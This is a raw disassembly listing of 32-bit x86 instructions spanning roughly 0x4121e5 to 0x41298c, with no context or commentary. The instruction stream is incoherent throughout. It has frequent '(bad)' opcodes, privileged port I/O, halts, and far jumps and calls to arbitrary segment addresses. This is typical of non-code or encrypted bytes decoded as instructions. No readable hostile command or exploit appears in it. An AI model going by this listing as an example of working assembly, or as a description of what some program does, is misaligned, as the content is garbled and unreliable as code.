  4121e5:	xor    eax,0x1d3e56cd
  4121ea:	fisubr WORD PTR [edi+0x2a8af214]
  4121f0:	mov    WORD PTR [edi-0x22],?
  4121f3:	pop    ebx
  4121f4:	xchg   ecx,edi
  4121f6:	out    dx,al
  4121f7:	call   0x2010:0x95870f6f
  4121fe:	cmpxchg DWORD PTR [esi],ecx
  412201:	push   0x16
  412203:	js     0x412246
  412205:	xchg   ebx,eax
  412206:	adc    BYTE PTR [eax],dh
  412208:	mov    edx,ds
  41220a:	xchg   ebx,eax
  41220b:	jl     0x412265
  41220d:	sub    edi,edi
  41220f:	cmp    al,0xa9
  412211:	mov    al,ds:0xb8212d8c
  412216:	jmp    0x54cb:0x42ad6ed6
  41221d:	xchg   DWORD PTR [esi+0x5f2b3de8],edi
  412223:	xor    al,0x47
  412225:	inc    edi
  412226:	imul   edi,ecx,0x76109194
  41222c:	xor    eax,0x33fc7c81
  412231:	add    ecx,DWORD PTR [edx]
  412233:	test   BYTE PTR [eax-0x58f30808],0x7
  41223a:	neg    DWORD PTR [edx]
  41223c:	aas    
  41223d:	repz call DWORD PTR [ecx-0x3f]
  412241:	ret    
  412242:	ss dec ecx
  412244:	fcomi  st,st(2)
  412246:	int    0x38
  412248:	cmp    DWORD PTR [edi+0x70],ebx
  41224b:	(bad)  
  41224c:	iret   
  41224d:	mov    BYTE PTR [ecx+0x33c789cb],0x8
  412254:	enter  0xd651,0xb9
  412258:	lock fisubr WORD PTR [edx]
  41225b:	dec    esp
  41225c:	push   cs
  41225d:	scas   eax,DWORD PTR es:[edi]
  41225e:	arpl   cx,si
  412260:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412261:	and    esi,DWORD PTR [ebp+0x27]
  412264:	jo     0x4122ca
  412266:	cmp    al,0xef
  412268:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412269:	int    0x15
  41226b:	jo     0x412254
  41226d:	add    bh,dl
  41226f:	jns    0x412242
  412271:	adc    eax,0x4bd5ea4
  412276:	(bad)  
  412277:	pop    ebp
  412278:	repnz mov dl,0xa3
  41227b:	in     eax,0xb8
  41227d:	xchg   ebx,eax
  41227e:	mov    ebx,0x3357ec81
  412283:	rcl    DWORD PTR [edi],0xc7
  412286:	sub    BYTE PTR fs:[edx+eax*1+0x44],ch
  41228b:	jb     0x4122c5
  41228d:	fmul   DWORD PTR [edx-0x21]
  412290:	aam    0x7b
  412292:	add    DWORD PTR [edx+0x48],0xffffff91
  412296:	div    ah
  412298:	mov    eax,ds:0x8fbed3f3
  41229d:	mov    esi,edi
  41229f:	enter  0x6c6d,0xae
  4122a3:	mov    ds:0x19c1d821,al
  4122a8:	mov    ah,0xaa
  4122aa:	aad    0x2b
  4122ac:	xchg   edx,eax
  4122ad:	and    ecx,DWORD PTR [ebx]
  4122af:	push   edx
  4122b0:	sbb    al,0x14
  4122b2:	rcl    ah,1
  4122b4:	shr    BYTE PTR [edi],cl
  4122b6:	or     al,0x40
  4122b8:	dec    esp
  4122b9:	lods   eax,DWORD PTR ds:[esi]
  4122ba:	std    
  4122bb:	inc    esp
  4122bc:	dec    edi
  4122bd:	mov    dh,0x1b
  4122bf:	pop    ebx
  4122c1:	push   ss
  4122c2:	test   BYTE PTR [ebx+0x3fe2c0ad],dl
  4122c8:	pop    sp
  4122ca:	mov    esi,0x997324d9
  4122cf:	push   esi
  4122d0:	jmp    0xa186:0x9d61cc05
  4122d7:	jecxz  0x4122ab
  4122d9:	push   ebx
  4122da:	sub    BYTE PTR [edi-0x4f],cl
  4122dd:	and    cl,BYTE PTR ds:0x1f600359
  4122e3:	fdivrp st(5),st
  4122e5:	and    BYTE PTR [ebp+edx*8+0x55],0x4b
  4122ea:	mov    ds:0x8129f079,al
  4122ef:	loopne 0x41227b
  4122f1:	or     DWORD PTR [eax+0x30ec7425],esp
  4122f7:	pop    ecx
  4122f8:	cli    
  4122f9:	or     cl,bh
  4122fb:	imul   ebx,DWORD PTR [ecx],0xfffffff6
  4122fe:	repz cmc 
  412300:	pop    edx
  412301:	or     eax,0x36cd56d1
  412306:	fwait
  412307:	pop    edx
  412308:	loope  0x412297
  41230a:	mov    ah,0xfb
  41230c:	xor    ecx,edx
  41230e:	xor    al,0x32
  412310:	cmp    al,BYTE PTR [eax+esi*1+0x76dad00a]
  412317:	lea    ecx,[ecx]
  412319:	hlt    
  41231a:	mov    esi,0x178af825
  41231f:	xchg   esi,eax
  412320:	mov    edi,0x649c1742
  412325:	adc    edx,DWORD PTR [edx]
  412327:	in     eax,0xec
  412329:	or     DWORD PTR [esp+ecx*4+0x781487b7],eax
  412330:	iret   
  412331:	ins    BYTE PTR es:[edi],dx
  412332:	jnp    0x889a5659
  412338:	repz push esp
  41233a:	push   ds
  41233b:	inc    edx
  41233c:	cmovae ecx,ecx
  41233f:	mov    bl,0x49
  412341:	xor    esi,DWORD PTR [edi+0xe33ceeb]
  412347:	hlt    
  412348:	adc    ebp,ecx
  41234a:	jne    0x41233b
  41234c:	(bad)  
  41234d:	lahf   
  41234e:	dec    ebx
  41234f:	push   ds
  412350:	scas   al,BYTE PTR es:[edi]
  412351:	mov    al,ds:0x4880ec7e
  412356:	push   0x9126ea31
  41235b:	pop    edi
  41235c:	(bad)  
  41235e:	inc    eax
  41235f:	xor    dh,BYTE PTR [esi+0x422a9ad8]
  412365:	mov    eax,0xf91aadba
  41236a:	sub    eax,0x8e477991
  41236f:	mov    BYTE PTR [ebp-0x33],dl
  412372:	cs inc edi
  412374:	add    al,0xa
  412376:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412377:	pop    eax
  412378:	xchg   ecx,eax
  412379:	cwde   
  41237a:	or     al,0x31
  41237c:	(bad)  
  41237d:	rcr    ecx,1
  41237f:	hlt    
  412380:	enter  0x42a2,0xd7
  412384:	sub    BYTE PTR [edi+0x517861f3],dl
  41238a:	arpl   dx,si
  41238c:	loopne 0x412407
  41238e:	inc    eax
  41238f:	aaa    
  412390:	push   ebp
  412391:	(bad)  
  412393:	mov    edx,0xab093345
  412398:	or     ah,bl
  41239a:	rcl    DWORD PTR [edx-0x57359b33],0xc5
  4123a1:	leave  
  4123a2:	enter  0xc0c9,0x7b
  4123a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4123a7:	out    dx,eax
  4123a8:	sbb    DWORD PTR [edx-0x14],esp
  4123ab:	sub    eax,0x96cdf6f2
  4123b0:	out    0x18,eax
  4123b2:	sub    DWORD PTR [edi+eax*2-0x76],ecx
  4123b6:	mov    edi,0x97f0fb53
  4123bb:	mov    dl,0xe5
  4123bd:	pop    esi
  4123be:	ret    
  4123bf:	(bad)  
  4123c0:	mov    esi,DWORD PTR [ebp-0x391a5fec]
  4123c6:	leave  
  4123c7:	sbb    ebx,DWORD PTR [edi+0x69df835b]
  4123cd:	xor    DWORD PTR [eax-0x5f5fb896],ecx
  4123d3:	daa    
  4123d4:	inc    ebp
  4123d5:	sbb    ecx,DWORD PTR [ecx+edx*4-0x46]
  4123d9:	in     eax,dx
  4123da:	xlat   BYTE PTR ds:[ebx]
  4123db:	xor    DWORD PTR [esi-0x64],0xffffffa1
  4123df:	ror    DWORD PTR [ebx+0x1b],cl
  4123e2:	retf   
  4123e3:	lods   eax,DWORD PTR ds:[esi]
  4123e4:	cs jae 0x412443
  4123e7:	add    edx,esi
  4123e9:	cmc    
  4123ea:	stc    
  4123eb:	pop    DWORD PTR [edi]
  4123ed:	(bad)  
  4123ee:	mov    dh,0xef
  4123f0:	dec    eax
  4123f1:	fimul  DWORD PTR [edi+eax*8+0xb]
  4123f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4123f6:	lock fiadd DWORD PTR [ecx]
  4123f9:	adc    ebp,ecx
  4123fb:	xchg   esi,eax
  4123fc:	pop    esp
  4123fe:	mov    ebp,0x6c6e2d68
  412403:	test   DWORD PTR [ebp-0x7937735e],ebp
  412409:	xchg   edi,eax
  41240a:	xchg   esp,eax
  41240b:	ss leave 
  41240d:	cwde   
  41240e:	dec    edx
  41240f:	add    ebx,ecx
  412411:	lods   al,BYTE PTR ds:[esi]
  412412:	mov    al,0x2f
  412414:	and    bl,BYTE PTR [ebp-0x24fabcf4]
  41241a:	pop    edx
  41241b:	inc    edx
  41241c:	jno    0x4123d2
  41241e:	adc    al,0x2c
  412420:	sub    eax,0xb0bcf84f
  412425:	ja     0x41245e
  412427:	dec    esp
  412428:	push   edx
  412429:	fst    DWORD PTR [eax-0x5f17f6dc]
  41242f:	mov    eax,ds:0x6168d39d
  412434:	sti    
  412435:	and    eax,ebx
  412437:	dec    ebx
  412438:	xchg   edx,eax
  412439:	sti    
  41243a:	inc    eax
  41243b:	sbb    ecx,DWORD PTR [esi+ebp*4+0x50]
  41243f:	pop    esi
  412440:	push   ecx
  412441:	hlt    
  412442:	sar    DWORD PTR [edx],1
  412444:	test   eax,0xf8e85db2
  412449:	leave  
  41244a:	push   eax
  41244b:	scas   eax,DWORD PTR es:[edi]
  41244c:	sbb    ebx,edx
  41244e:	mov    esp,0x479cab2c
  412453:	in     al,dx
  412454:	dec    esi
  412455:	sbb    eax,DWORD PTR [ebp+0x88098be]
  41245b:	iret   
  41245c:	xchg   edi,eax
  41245d:	fld    TBYTE PTR [eax]
  41245f:	lds    eax,FWORD PTR [esi]
  412461:	sahf   
  412462:	fs xchg ebx,eax
  412464:	stc    
  412465:	or     BYTE PTR [esi-0x2ade1a89],ah
  41246b:	fmulp  st(4),st
  41246d:	jmp    0xc831:0x6a08b906
  412474:	out    0x5,al
  412476:	retf   
  412477:	sbb    al,0x3
  412479:	mov    esp,0xc17fa3ac
  41247e:	jmp    0x4278:0x34a9155
  412485:	xchg   esp,eax
  412486:	nop
  412487:	and    DWORD PTR [eax+0x48],eax
  41248a:	test   al,0xf8
  41248c:	addr16 int 0x1c
  41248f:	pop    es
  412490:	mov    esi,0x28c722b6
  412495:	lods   eax,DWORD PTR ds:[esi]
  412496:	out    dx,eax
  412497:	mov    eax,0xe63ced11
  41249c:	push   esi
  41249d:	loop   0x412420
  41249f:	fstp   DWORD PTR [esi]
  4124a1:	add    ebp,esp
  4124a3:	ins    BYTE PTR es:[edi],dx
  4124a4:	sbb    al,0x25
  4124a6:	ins    DWORD PTR es:[edi],dx
  4124a7:	jbe    0x4124eb
  4124a9:	mov    ah,0x5a
  4124ab:	jg     0x412526
  4124ad:	fwait
  4124ae:	xlat   BYTE PTR ds:[ebx]
  4124af:	in     al,dx
  4124b0:	daa    
  4124b1:	idiv   DWORD PTR [edx-0x7223b6a9]
  4124b7:	cmp    edx,DWORD PTR [edi+0x5c]
  4124ba:	cmp    DWORD PTR [edx+0x4ae1fe52],ecx
  4124c0:	sub    al,0x67
  4124c2:	shl    DWORD PTR [ebx+0x42],0x65
  4124c6:	ins    BYTE PTR es:[edi],dx
  4124c7:	nop
  4124c8:	inc    ebx
  4124c9:	push   edi
  4124ca:	cld    
  4124cb:	in     al,dx
  4124cc:	aad    0xd5
  4124ce:	iret   
  4124cf:	pop    edx
  4124d0:	xor    al,0x3
  4124d2:	pop    edi
  4124d3:	or     BYTE PTR [esp+edx*8],dh
  4124d6:	inc    ebx
  4124d7:	or     dl,0x81
  4124da:	ds int3 
  4124dc:	retf   
  4124dd:	mov    ds:0xb81f5750,eax
  4124e2:	mov    eax,0xc61f6754
  4124e7:	pop    ds
  4124e8:	mov    ch,0x15
  4124ea:	(bad)  
  4124eb:	mov    al,0xe2
  4124ed:	adc    eax,0x15f68cc2
  4124f2:	outs   dx,BYTE PTR ds:[esi]
  4124f3:	pop    edi
  4124f4:	pushf  
  4124f5:	(bad)  
  4124f6:	iret   
  4124f7:	retf   0x20bd
  4124fa:	jecxz  0x4124e4
  4124fc:	rcr    BYTE PTR [edi],cl
  4124fe:	retf   0xd344
  412501:	das    
  412502:	and    BYTE PTR [edx+0x6b],0xfd
  412506:	pop    ds
  412507:	push   esi
  412508:	test   BYTE PTR [edi-0xbfbb512],dh
  41250e:	adc    DWORD PTR [eax+ebp*8-0x21152ec2],ebx
  412515:	idiv   ebx
  412517:	loopne 0x4124fe
  412519:	inc    esi
  41251a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41251b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41251c:	inc    edx
  41251d:	xor    ch,ah
  41251f:	repnz mov al,ds:0xcadbf82e
  412525:	pop    ecx
  412526:	shr    ebx,1
  412528:	in     al,dx
  412529:	in     al,0x7e
  41252b:	xchg   ebp,eax
  41252c:	cmp    eax,0x2896e1ef
  412531:	cld    
  412532:	(bad)  
  412533:	cli    
  412534:	pop    ebp
  412535:	dec    esi
  412536:	pop    ds
  412537:	xchg   esi,eax
  412538:	mov    esi,0xe386b90d
  41253d:	jne    0x4124ea
  41253f:	pop    ds
  412540:	scas   eax,DWORD PTR es:[edi]
  412541:	loopne 0x4125a7
  412543:	mov    BYTE PTR [esp+edx*4],0xd9
  412547:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412548:	mov    esi,0x91d1fad3
  41254d:	mov    cl,0xdf
  41254f:	ja     0x412594
  412551:	sub    al,0x23
  412553:	popa   
  412554:	cwde   
  412555:	in     eax,0x2d
  412557:	imul   esi,DWORD PTR [edi-0x5a918228],0xffffff90
  41255e:	xor    BYTE PTR [ebp+0x11],bh
  412561:	shl    cl,1
  412563:	lods   al,BYTE PTR cs:[esi]
  412565:	retf   
  412566:	out    0x23,al
  412568:	out    dx,eax
  412569:	mov    ch,0xbe
  41256b:	lods   al,BYTE PTR ds:[esi]
  41256c:	sbb    al,0x1b
  41256e:	xchg   esp,eax
  41256f:	repnz mov ah,0x2c
  412572:	lods   eax,DWORD PTR ds:[esi]
  412573:	inc    ebx
  412574:	stos   BYTE PTR es:[edi],al
  412575:	sub    bh,BYTE PTR [edi+0x42]
  412578:	pop    ecx
  412579:	xchg   esp,eax
  41257a:	jns    0x4125db
  41257c:	pop    ebp
  41257d:	icebp  
  41257e:	mov    BYTE PTR [eax+0x1672b056],dh
  412584:	int3   
  412585:	jno    0x4125fd
  412587:	push   edx
  412588:	jns    0x4125a7
  41258a:	add    ah,BYTE PTR [ebp+0x3f]
  41258d:	mov    dh,BYTE PTR [ecx-0x79bf028c]
  412593:	popa   
  412594:	lods   eax,DWORD PTR ds:[esi]
  412595:	(bad)  
  412596:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412597:	mov    dh,0x5d
  412599:	or     al,bl
  41259b:	lock xchg ebp,eax
  41259d:	sub    DWORD PTR [edx-0x55],eax
  4125a0:	test   BYTE PTR [ebp+0x13],dl
  4125a3:	and    DWORD PTR [edi-0x11],0xf
  4125a7:	inc    ebx
  4125a8:	call   DWORD PTR [ebp-0x7e]
  4125ab:	pop    esp
  4125ac:	jns    0x4125e9
  4125ae:	bound  esi,QWORD PTR [esi+0x1f153ff4]
  4125b4:	push   0x50
  4125b6:	test   esp,edx
  4125b8:	pop    ds
  4125b9:	enter  0xc1f3,0xe3
  4125bd:	pop    esi
  4125be:	(bad)  
  4125bf:	and    DWORD PTR ds:0xc11193cf,edx
  4125c5:	xchg   ebp,eax
  4125c6:	cld    
  4125c7:	or     BYTE PTR [ebp+ecx*8+0x7643b2d4],dl
  4125ce:	xor    esi,ebx
  4125d0:	cdq    
  4125d1:	retf   0x758e
  4125d4:	stos   BYTE PTR es:[edi],al
  4125d5:	or     al,0x2c
  4125d7:	or     eax,0xf13920ca
  4125dc:	(bad)  
  4125dd:	inc    BYTE PTR [edx-0x3d]
  4125e0:	push   eax
  4125e1:	push   ebp
  4125e2:	aad    0x60
  4125e4:	std    
  4125e5:	ret    
  4125e6:	mov    dh,0x6e
  4125e8:	cmp    ecx,DWORD PTR [esi+0x7fd037f]
  4125ee:	stos   DWORD PTR es:[edi],eax
  4125ef:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  4125f1:	push   ss
  4125f2:	mov    eax,0xb717f2c7
  4125f7:	sbb    eax,0x34edb21
  4125fc:	xchg   edx,eax
  4125fd:	sbb    bl,BYTE PTR [edx]
  4125ff:	jo     0x4125eb
  412601:	lock add edx,esi
  412604:	xlat   BYTE PTR ds:[ebx]
  412605:	shl    DWORD PTR [ebx-0x72],1
  412608:	into   
  412609:	fdivr  st(1),st
  41260b:	pop    es
  41260c:	jns    0x4125e7
  41260e:	sbb    eax,0x1ab79efd
  412613:	(bad)  
  412614:	lods   al,BYTE PTR ds:[esi]
  412615:	xlat   BYTE PTR ds:[ebx]
  412616:	ja     0x4125ba
  412618:	mov    WORD PTR [eax+0x61],fs
  41261b:	jbe    0x41263d
  41261d:	mov    eax,ds:0xe47e0ab8
  412622:	pop    ecx
  412623:	scas   al,BYTE PTR es:[edi]
  412624:	cmp    al,0x84
  412626:	adc    BYTE PTR [esi+ebp*2+0x31],dl
  41262a:	int3   
  41262b:	sti    
  41262c:	nop
  41262d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41262e:	add    BYTE PTR [esi-0x1b],ch
  412631:	ss and eax,0xf9c8c590
  412637:	cmp    edi,DWORD PTR [ecx]
  412639:	mov    ah,0x86
  41263b:	inc    eax
  41263c:	in     eax,0xcf
  41263e:	mov    bl,0x7b
  412640:	fdiv   DWORD PTR [edi+0xc]
  412643:	out    0x7a,al
  412645:	jg     0x412624
  412647:	jae    0x4125df
  412649:	(bad)  
  41264a:	daa    
  41264b:	fistp  WORD PTR [ecx-0x2]
  41264e:	jmp    0x86ff58bd
  412653:	mov    eax,ds:0xc0afe660
  412658:	int3   
  412659:	out    0xb4,al
  41265b:	jmp    0x408d1aef
  412660:	nop
  412661:	xchg   edi,eax
  412662:	int    0x91
  412664:	inc    ecx
  412665:	jmp    0xae32:0x74bc9e82
  41266c:	test   al,0xbc
  41266e:	xchg   esp,eax
  41266f:	push   0xd12fabbf
  412674:	dec    esi
  412675:	xor    BYTE PTR [edi+0x6cbc36fd],bl
  41267b:	(bad)  
  41267d:	(bad)  
  41267e:	or     al,0x7d
  412680:	lods   al,BYTE PTR ds:[esi]
  412681:	mov    esp,0x1b3ba8e4
  412686:	lds    esp,FWORD PTR [eax]
  412688:	push   eax
  412689:	int3   
  41268a:	pusha  
  41268b:	jp     0x412689
  41268d:	fdiv   QWORD PTR [ecx]
  41268f:	add    al,0xc3
  412691:	leave  
  412692:	push   es
  412693:	dec    ecx
  412694:	and    al,0x7f
  412696:	bound  esi,QWORD PTR [edi]
  412698:	xchg   ebp,eax
  412699:	(bad)  
  41269a:	rol    dh,1
  41269c:	jae    0x412664
  41269e:	outs   dx,BYTE PTR ds:[esi]
  41269f:	call   0x1a67:0x32a527fe
  4126a6:	push   esi
  4126a7:	adc    esp,DWORD PTR [edi+0x487179a7]
  4126ad:	sbb    eax,0x10ae915f
  4126b2:	clc    
  4126b3:	mov    ah,cl
  4126b5:	repnz (bad)
  4126b9:	pop    ss
  4126ba:	sub    al,0xce
  4126bc:	int    0xbf
  4126be:	out    0xd8,al
  4126c0:	ret    
  4126c1:	fcomp  QWORD PTR [edi+0x1a]
  4126c4:	cmp    BYTE PTR [edi],dl
  4126c6:	dec    edx
  4126c7:	imul   ebp,DWORD PTR [edx+0x44],0xffffffb2
  4126cb:	jo     0x41267b
  4126cd:	fidiv  WORD PTR [eax]
  4126cf:	or     eax,0xedc59ec8
  4126d4:	pop    ecx
  4126d5:	mov    dl,BYTE PTR [edx]
  4126d7:	xchg   BYTE PTR ds:0x8cb866e6,dh
  4126dd:	jmp    0x412701
  4126df:	retf   
  4126e0:	dec    eax
  4126e1:	mov    eax,eax
  4126e3:	loop   0x412683
  4126e5:	and    DWORD PTR [eax],esi
  4126e7:	(bad)  
  4126e8:	mov    bh,0xb9
  4126ea:	popf   
  4126eb:	xor    eax,0xf3a1a5a0
  4126f0:	xor    dl,BYTE PTR [ebx]
  4126f2:	sbb    edx,DWORD PTR [edx+0x17]
  4126f5:	jp     0x4126e1
  4126f7:	ss adc al,0xa7
  4126fa:	adc    BYTE PTR [edx+0x58],ah
  4126fd:	sbb    al,cl
  4126ff:	mov    al,ds:0x91dff1c5
  412704:	cwde   
  412705:	jecxz  0x4126ba
  412707:	mov    ds:0xf7e5d882,eax
  41270c:	cmp    al,0xa5
  41270e:	sahf   
  41270f:	popa   
  412710:	sub    eax,0xffffffcb
  412713:	xor    al,0x94
  412715:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412716:	jle    0x4126a2
  412718:	mov    ecx,0x1e70d2bb
  41271d:	pop    esp
  41271e:	push   ecx
  41271f:	jne    0x412777
  412721:	rcr    DWORD PTR [eax+0x1333d43],0x57
  412728:	add    DWORD PTR [eax+0x75],esp
  41272b:	mov    esi,0xdb45056d
  412730:	gs add bh,cl
  412733:	fild   QWORD PTR [esi]
  412735:	(bad)  
  412736:	sub    eax,esi
  412738:	in     al,0x5e
  41273a:	retf   
  41273b:	push   edi
  41273c:	rcl    DWORD PTR [eax-0x791a6024],1
  412742:	mwait  
  412745:	call   0x82931f4b
  41274a:	test   eax,0x512a4da6
  41274f:	ds loope 0x4127c9
  412752:	sub    eax,0x61904f40
  412757:	aaa    
  412758:	sbb    BYTE PTR [eax+0x6128d9ff],bl
  41275e:	(bad)  
  41275f:	xchg   edx,eax
  412760:	sahf   
  412761:	das    
  412762:	add    al,0xe8
  412764:	adc    al,0x7e
  412766:	sub    DWORD PTR [ebp+ebp*2+0x47bc9340],esp
  41276d:	mov    edi,DWORD PTR [edx]
  41276f:	loopne 0x412762
  412771:	aam    0x71
  412773:	clc    
  412774:	fs scas eax,DWORD PTR es:[edi]
  412776:	ins    BYTE PTR es:[edi],dx
  412777:	ja     0x412716
  412779:	js     0x4127a4
  41277b:	sub    ch,BYTE PTR [edi+eax*2]
  41277e:	lods   eax,DWORD PTR ds:[esi]
  41277f:	popa   
  412780:	into   
  412781:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412782:	gs ds jbe 0x4127cf
  412786:	les    ebx,FWORD PTR [ecx-0x47]
  412789:	xchg   esp,eax
  41278a:	sub    eax,0x10dd0bdf
  41278f:	cmp    edx,esi
  412791:	add    al,0x19
  412793:	out    0xfa,eax
  412795:	mov    bh,0x9d
  412797:	enter  0x2b50,0x2
  41279b:	inc    eax
  41279c:	ss add eax,0x4a5735fc
  4127a2:	lock fadd DWORD PTR [ebp-0x79]
  4127a6:	int3   
  4127a7:	mov    edi,0xd0d0b133
  4127ac:	fnstenv [esp+edx*2]
  4127af:	cmp    dl,BYTE PTR [edi-0x493d7919]
  4127b5:	imul   BYTE PTR [ecx+0x60]
  4127b8:	sub    eax,0xa82b4cf8
  4127bd:	xlat   BYTE PTR ds:[ebx]
  4127be:	cmp    al,0xf8
  4127c0:	xchg   esi,eax
  4127c2:	mov    esp,0xd793cf85
  4127c7:	mov    bl,0xe5
  4127c9:	retf   
  4127ca:	repnz xor BYTE PTR [ecx+edi*1],0xcb
  4127cf:	pop    esp
  4127d0:	adc    bl,ch
  4127d2:	bound  ecx,QWORD PTR [ebp-0x47]
  4127d5:	sub    BYTE PTR [ecx],dl
  4127d7:	cwde   
  4127d8:	push   esp
  4127d9:	enter  0x4566,0xcd
  4127dd:	test   BYTE PTR [edx+0x31f92e6b],al
  4127e3:	or     DWORD PTR [edi+0x7b],ebx
  4127e6:	popf   
  4127e7:	bound  ecx,QWORD PTR [esi-0x4a]
  4127ea:	daa    
  4127eb:	dec    ebp
  4127ec:	rcl    DWORD PTR ds:0x9951824,cl
  4127f2:	sub    eax,0xcf2c4125
  4127f7:	ret    0xa075
  4127fa:	add    BYTE PTR [ecx+0x1ead8689],al
  412800:	push   0x32941c41
  412805:	out    0x5a,eax
  412807:	into   
  412808:	add    al,0xa9
  41280a:	mov    ds:0x9be51fd0,eax
  41280f:	xor    BYTE PTR [edi+esi*4-0x5c],0x88
  412814:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412815:	mov    ch,0xf0
  412817:	mov    ah,0x9f
  412819:	ret    
  41281a:	inc    ebp
  41281b:	data16 xor bl,BYTE PTR [ecx-0x6d2eb0a8]
  412822:	jno    0x4127ec
  412824:	add    al,0x91
  412826:	iret   
  412827:	sub    eax,eax
  412829:	into   
  41282a:	fs mov ah,0xe0
  41282d:	and    al,0xd5
  41282f:	xor    al,0xc1
  412831:	jb     0x41288e
  412833:	inc    ebx
  412834:	jp     0x4127d4
  412836:	(bad)  
  412837:	push   ds
  412838:	inc    edi
  412839:	fnstcw WORD PTR [ebp+0x30279db]
  41283f:	adc    edx,ebx
  412841:	add    al,0xfa
  412843:	aas    
  412844:	out    dx,eax
  412845:	and    BYTE PTR [edi+0x26],al
  412848:	and    ebx,DWORD PTR [eax-0xfadbf82]
  41284e:	jbe    0x4128ae
  412850:	pop    ds
  412851:	mov    fs,WORD PTR [esi+ebp*8]
  412854:	daa    
  412855:	pop    ebp
  412856:	das    
  412857:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412858:	retf   
  412859:	ds push es
  41285b:	inc    ecx
  41285c:	addr16 pop eax
  41285e:	popf   
  41285f:	sub    DWORD PTR [edi],esp
  412861:	mov    edi,0xaae9ecfd
  412866:	repz das 
  412868:	dec    edi
  412869:	xchg   ebp,eax
  41286a:	dec    ecx
  41286b:	pop    edx
  41286c:	adc    DWORD PTR [ecx],ebp
  41286e:	iret   
  41286f:	inc    ebx
  412870:	xchg   ebp,eax
  412871:	push   esi
  412873:	mov    al,ds:0x52e8a6e
  412878:	fcmovnu st,st(2)
  41287a:	int3   
  41287b:	sti    
  41287c:	mov    esp,0x9b37d588
  412881:	leave  
  412882:	sub    al,ch
  412884:	xchg   ebx,eax
  412885:	cld    
  412886:	xchg   BYTE PTR [edi+ebp*8-0x3fd31da6],dl
  41288d:	ficomp DWORD PTR ds:0xd96539b6
  412893:	mov    BYTE PTR [ecx],ah
  412895:	add    DWORD PTR [ebx],edx
  412897:	scas   al,BYTE PTR es:[edi]
  412898:	xchg   ebx,eax
  412899:	xchg   ebp,eax
  41289a:	bound  esp,QWORD PTR [ebp+0x24c34be4]
  4128a0:	dec    ebx
  4128a1:	mov    ds:0x1956cfbd,eax
  4128a6:	scas   al,BYTE PTR es:[edi]
  4128a7:	cmp    ah,BYTE PTR [edi-0x5408bdf2]
  4128ad:	sub    al,0xf1
  4128af:	and    al,0x1f
  4128b1:	in     eax,dx
  4128b2:	mul    DWORD PTR [edx+edi*2+0x418a33a2]
  4128b9:	cmc    
  4128ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4128bb:	add    dh,BYTE PTR [edx-0x7d]
  4128be:	sar    DWORD PTR [ecx+0x31],0xc3
  4128c2:	cwde   
  4128c3:	jl     0x412935
  4128c5:	in     eax,dx
  4128c6:	pop    DWORD PTR [ebx-0x27]
  4128c9:	inc    edx
  4128ca:	mov    BYTE PTR [esi+edi*8],dh
  4128cd:	push   esp
  4128ce:	scas   al,BYTE PTR es:[edi]
  4128cf:	loop   0x4128ce
  4128d1:	sub    al,0x19
  4128d3:	and    eax,0x248faf29
  4128d8:	ja     0x4128e7
  4128da:	aas    
  4128db:	test   eax,0x1bee3409
  4128e0:	popa   
  4128e1:	xor    edi,DWORD PTR [esp+ecx*1]
  4128e4:	xchg   esi,eax
  4128e5:	or     edi,DWORD PTR [edx+0x771575c9]
  4128eb:	retf   
  4128ec:	out    0x4f,eax
  4128ee:	cmc    
  4128ef:	pop    eax
  4128f0:	xchg   edx,eax
  4128f1:	mov    al,0x8a
  4128f3:	sbb    al,0xfd
  4128f5:	retf   
  4128f6:	mov    ah,0x11
  4128f8:	sub    al,0x3b
  4128fa:	sub    DWORD PTR [ecx],edi
  4128fc:	(bad)  
  4128fe:	sahf   
  4128ff:	and    eax,0x36c8cfcf
  412904:	dec    ecx
  412905:	mov    cl,0x31
  412907:	imul   BYTE PTR [edi-0x65a2c858]
  41290d:	and    BYTE PTR [eax],0x23
  412910:	mov    ds:0x21aeacd6,al
  412915:	call   0xf051ac06
  41291a:	add    bh,0x8c
  41291d:	or     bl,0xc3
  412920:	sbb    ah,bh
  412922:	and    al,0xbf
  412924:	lahf   
  412925:	xor    al,0x68
  412927:	ror    DWORD PTR ds:0x6bd53b62,1
  41292d:	adc    dh,BYTE PTR [ebp-0x1]
  412930:	cmp    al,0x59
  412932:	lds    edi,FWORD PTR [esp+ebx*2+0x60fd1211]
  412939:	and    eax,0x8bcf8802
  41293e:	xchg   DWORD PTR [esi+0x758ad141],ecx
  412944:	lods   al,BYTE PTR ds:[esi]
  412945:	inc    ebp
  412946:	jge    0x4128ef
  412948:	or     eax,0x66f8bf2a
  41294d:	xchg   edi,eax
  41294e:	dec    esp
  41294f:	cmp    al,0xab
  412951:	cmp    DWORD PTR [ebx-0x2a],edi
  412954:	and    bl,ch
  412956:	in     eax,0xe
  412958:	jbe    0x412921
  41295a:	retf   0x171f
  41295d:	xchg   esi,eax
  41295e:	ret    
  41295f:	or     bh,bl
  412961:	mov    WORD PTR [ebx],ds
  412963:	bound  edi,QWORD PTR [ecx+0x3d]
  412966:	in     al,dx
  412967:	xor    ecx,ebx
  412969:	cmp    ebx,ebp
  41296b:	sti    
  41296c:	adc    al,0x5d
  41296e:	pusha  
  41296f:	cli    
  412970:	sub    al,0xd9
  412972:	fsub   QWORD PTR [bp+di]
  412975:	add    al,0xe8
  412977:	mov    eax,esi
  412979:	mov    bh,0x84
  41297b:	in     eax,0x97
  41297d:	sbb    eax,0xa5a39964
  412982:	dec    esi
  412983:	mov    ah,cl
  412985:	add    BYTE PTR [ecx-0x54],bl
  412988:	(bad)  
  412989:	stos   BYTE PTR es:[edi],al
  41298a:	js     0x4129b4
  41298c:	push   ebx
